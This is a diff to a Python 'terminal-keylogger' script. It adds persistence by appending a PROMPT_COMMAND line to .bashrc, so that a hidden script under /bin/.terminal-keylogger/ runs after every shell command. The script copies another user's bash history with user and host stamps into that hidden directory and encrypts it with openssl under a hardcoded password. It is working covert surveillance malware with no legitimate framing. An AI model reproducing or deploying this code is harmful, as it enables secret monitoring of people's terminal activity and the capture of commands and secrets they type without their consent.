@@ -1,8 +1,28 @@
 import os
 import socket
-import tarfile
 import getpass
 from datetime import datetime
+
+def append_to_bashrc(line):
+    username = getpass.getuser()
+    # Append to root's .bashrc
+    if username == "root":
+        home_directory = "/root"
+    else:
+        home_directory = f"/home/{username}"
+    
+    # Check if line already exists
+    with open(f"{home_directory}/.bashrc", "r") as bashrc_file:
+        if line in bashrc_file.read():
+            #print(f"Line '{line}' already exists in .bashrc")
+            return
+
+    # Append the line if it doesn't exist
+    with open(f"{home_directory}/.bashrc", "a") as bashrc_file:
+        bashrc_file.write(line + "\n")
+
+line_to_append = 'export PROMPT_COMMAND="history -a;python /bin/.terminal-keylogger/.terminal-keylogger.py;$PROMPT_COMMAND"'
+append_to_bashrc(line_to_append)
 
 def modify_bash_history(input_file, output_file):
     # We check if output file exists
@@ -30,9 +50,10 @@ def modify_bash_history(input_file, output_file):
             modified_new_lines.append(line)
         else:
             hostname = socket.gethostname()
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            modified_time = os.path.getmtime(input_file)
+            timestamp = datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %H:%M:%S')
             username = getpass.getuser()
-            modified_new_lines.append(f":~$ {line.rstrip()} T {timestamp} - BY {username}@{hostname}\n")
+            modified_new_lines.append(f":~$ {line.rstrip()} \nT {timestamp} - BY {username}@{hostname}\n")
 
     # Append modified new lines to the output file
     with open(output_file, 'a') as f:
@@ -45,13 +66,17 @@ if __name__ == "__main__":
     if username == "root":
         input_file = "/root/.bash_history"
     else:
-        input_file = f"/home/{username}/.bash_history"
+        home_dir = None
+        for entry in os.listdir("/home"):
+            if os.path.isdir(os.path.join("/home", entry)) and entry != "root":
+                home_dir = entry
+                break
+
+        if home_dir:
+           input_file = f"/home/{home_dir}/.bash_history"
     
-    # Determine output directory based on user
-    if username == "root":
-        output_directory = "/usr/bin/.terminal-keylogger/"
-    else:
-        output_directory = f"/home/{username}/.terminal-keylogger/"
+
+    output_directory = "/bin/.terminal-keylogger/"
 
     # Ensure the output directory exists
     os.makedirs(output_directory, exist_ok=True)
@@ -62,24 +87,16 @@ if __name__ == "__main__":
     # Modify bash history and append new lines to the output file
     modify_bash_history(input_file, output_file)
 
-    # Archive the modified file into a tar archive
-    archive_file = output_file + '.tar.gz'
-    with tarfile.open(archive_file, 'w:gz') as tar:
-        tar.add(output_file)
-
-    # Remove the original modified file
-    os.remove(output_file)
-
     # Encrypt the tar archive with a password using PBKDF2 key derivation
     password = "your_password"  # Replace this with your own password
-    encrypted_file = output_file + '.tar.gz.enc'
-    os.system(f'openssl aes-256-cbc -a -salt -pbkdf2 -in {archive_file} -out {encrypted_file} -k {password}')
+    encrypted_file = output_file + '.enc'
+    os.system(f'openssl aes-256-cbc -a -salt -pbkdf2 -in {output_file} -out {encrypted_file} -k {password}')
 
     # Remove the original tar archive
-    os.remove(archive_file)
+    os.remove(output_file)
 
-    #print("___")
+    print("___")
     
     
     # Command To Decrypt - 
-    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in termkeys-attackvector99onsoren.md.tar.gz.enc -out output_file.tar.gz -k your_password
+    # openssl aes-256-cbc -d -a -salt -pbkdf2 -in termkeys-attackvector99onsoren.md.tar.gz.enc -out output_file.md -k your_password
